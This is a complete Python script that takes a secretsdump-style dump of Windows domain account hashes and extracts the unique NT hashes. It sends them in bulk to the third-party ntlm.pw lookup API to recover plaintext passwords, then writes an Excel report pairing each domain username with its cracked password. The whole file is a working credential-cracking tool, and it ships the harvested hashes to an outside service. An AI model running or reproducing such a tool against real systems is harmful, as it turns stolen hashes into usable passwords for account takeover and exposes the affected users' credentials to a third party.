#!/usr/bin/env python3
"""
final.py - one-shot hash dump -> ntlm.pw lookup -> Excel report

Usage:
    python3 final.py ../all-dump.txt -o results.xlsx
    python3 final.py ../all-dump.txt -o results.xlsx -t nt --no-lookup

Does, in order:
    1. Extract unique NT hashes from a secretsdump-style file
    2. Look them up against the ntlm.pw API (300/request, rate-limit aware)
    3. Write a 2-sheet Excel report (All_Hashes + Cracked_Passwords)
"""

import os
import re
import sys
import time
import argparse

import requests
import pandas as pd
from openpyxl import load_workbook
from openpyxl.styles import Font, PatternFill

API_BASE_URL = "https://ntlm.pw/api/lookup"


# --------------------------------------------------------------------------- #
# 1. Extraction                                                               #
# --------------------------------------------------------------------------- #
def extract_nt_hashes(input_file):
    """Return a sorted list of unique NT hashes found in the dump."""
    print(f"[*] Extracting NT hashes from {input_file}...")
    nt_hashes = set()
    pattern = r'(?:[^\s:]+\\)?[^\s:]+:\d+:[a-f0-9]{32}:([a-f0-9]{32}):::'

    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                match = re.search(pattern, line)
                if match:
                    nt_hashes.add(match.group(1))
                elif re.match(r'^[a-f0-9]{32}$', line):
                    nt_hashes.add(line)
    except FileNotFoundError:
        print(f"[!] Error: File '{input_file}' not found")
        sys.exit(1)

    hashes = sorted(nt_hashes)
    print(f"[+] Extracted {len(hashes)} unique NT hashes")
    return hashes


# --------------------------------------------------------------------------- #
# 2. Lookup                                                                    #
# --------------------------------------------------------------------------- #
def bulk_lookup(hash_type, hashes):
    """Look up hashes in chunks of 300. Returns {hash: password} for hits."""
    cracked = {}
    url = f"{API_BASE_URL}?hashtype={hash_type}"
    i = 0
    total = len(hashes)

    while i < total:
        chunk = hashes[i:i + 300]
        print(f"[*] Looking up {i + 1}-{min(i + 300, total)} of {total}...")
        try:
            resp = requests.post(
                url,
                headers={"Content-Type": "text/plain"},
                data="\n".join(chunk),
            )
            if resp.status_code == 200:
                for line in resp.text.strip().split("\n"):
                    if ':' in line and '[not found]' not in line.lower():
                        h, pw = line.split(':', 1)
                        h, pw = h.strip().lower(), pw.strip()
                        if h and pw:
                            cracked[h] = pw
                            print(f"    [+] {h}:{pw}")
                i += 300
                if i < total:
                    time.sleep(5)
            elif resp.status_code == 429:
                print("[!] Rate limit (429). Waiting 15 minutes before retrying...",
                      file=sys.stderr)
                time.sleep(900)  # retry same chunk, do not advance i
            else:
                print(f"[!] Unexpected status {resp.status_code}; skipping chunk",
                      file=sys.stderr)
                i += 300
                time.sleep(5)
        except requests.exceptions.RequestException as e:
            print(f"[!] Network error: {e}; skipping chunk", file=sys.stderr)
            i += 300

    print(f"[+] Cracked {len(cracked)} of {total} hashes")
    return cracked


# --------------------------------------------------------------------------- #
# 3. Report                                                                    #
# --------------------------------------------------------------------------- #
def parse_hash_file(file_path):
    """Parse every user:rid:lm:nt::: line into structured rows."""
    data = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split(':')
            if len(parts) >= 4:
                domain_user = parts[0]
                if '\\' in domain_user:
                    domain, username = domain_user.split('\\', 1)
                else:
                    domain, username = "", domain_user
                data.append({
                    'Domain': domain,
                    'Username': username,
                    'UID': parts[1],
                    'LM Hash': parts[2],
                    'NT Hash': parts[3],
                })
    return data


def match_passwords(hash_data, cracked):
    """Return domain/user/password rows for accounts whose hash was cracked."""
    matched = []
    for entry in hash_data:
        nt = entry['NT Hash'].lower()
        lm = entry['LM Hash'].lower()
        password = cracked.get(nt) or cracked.get(lm)
        if password:
            matched.append({
                'Domain': entry['Domain'],
                'Username': entry['Username'],
                'Password': password,
            })
    return matched


def style_sheet(ws, has_data=True):
    if not has_data:
        return
    header_font = Font(name='Titillium Web', size=11, bold=True)
    header_fill = PatternFill(start_color='366092', end_color='366092', fill_type='solid')
    for cell in ws[1]:
        cell.font = header_font
        cell.fill = header_fill
    data_font = Font(name='Titillium Web', size=10)
    for row in ws.iter_rows(min_row=2):
        for cell in row:
            cell.font = data_font
    for column in ws.columns:
        max_len = max((len(str(c.value)) for c in column if c.value is not None),
                      default=0)
        ws.column_dimensions[column[0].column_letter].width = min(max_len + 2, 50)


def save_to_excel(hash_data, matched, output_file):
    with pd.ExcelWriter(output_file, engine='openpyxl') as writer:
        if hash_data:
            pd.DataFrame(hash_data).to_excel(writer, sheet_name='All_Hashes', index=False)
        else:
            pd.DataFrame([['No hash data found']], columns=['Message']).to_excel(
                writer, sheet_name='All_Hashes', index=False)
        if matched:
            pd.DataFrame(matched).to_excel(writer, sheet_name='Cracked_Passwords', index=False)
        else:
            pd.DataFrame([['No cracked passwords found']], columns=['Message']).to_excel(
                writer, sheet_name='Cracked_Passwords', index=False)

    wb = load_workbook(output_file)
    style_sheet(wb['All_Hashes'], has_data=bool(hash_data))
    style_sheet(wb['Cracked_Passwords'], has_data=bool(matched))
    wb.save(output_file)
    print(f"[+] Sheet 1 - All_Hashes: {len(hash_data)} entries")
    print(f"[+] Sheet 2 - Cracked_Passwords: {len(matched)} entries")
    print(f"[+] Excel report created: {output_file}")


# --------------------------------------------------------------------------- #
# main                                                                         #
# --------------------------------------------------------------------------- #
def main():
    parser = argparse.ArgumentParser(
        description="Extract NT hashes, look them up via ntlm.pw, and build an Excel report.")
    parser.add_argument("dump", help="Input secretsdump-style hash file")
    parser.add_argument("-o", "--output", required=True, help="Output Excel (.xlsx) file")
    parser.add_argument("-t", "--type", default="nt",
                        choices=["nt", "lm", "md5", "sha1", "sha256"],
                        help="Hash type to look up (default: nt)")
    parser.add_argument("--no-lookup", action="store_true",
                        help="Skip the ntlm.pw lookup; build report from hashes only")
    args = parser.parse_args()

    hashes = extract_nt_hashes(args.dump)
    cracked = {} if args.no_lookup else bulk_lookup(args.type, hashes)

    hash_data = parse_hash_file(args.dump)
    matched = match_passwords(hash_data, cracked)
    save_to_excel(hash_data, matched, args.output)


if __name__ == "__main__":
    main()
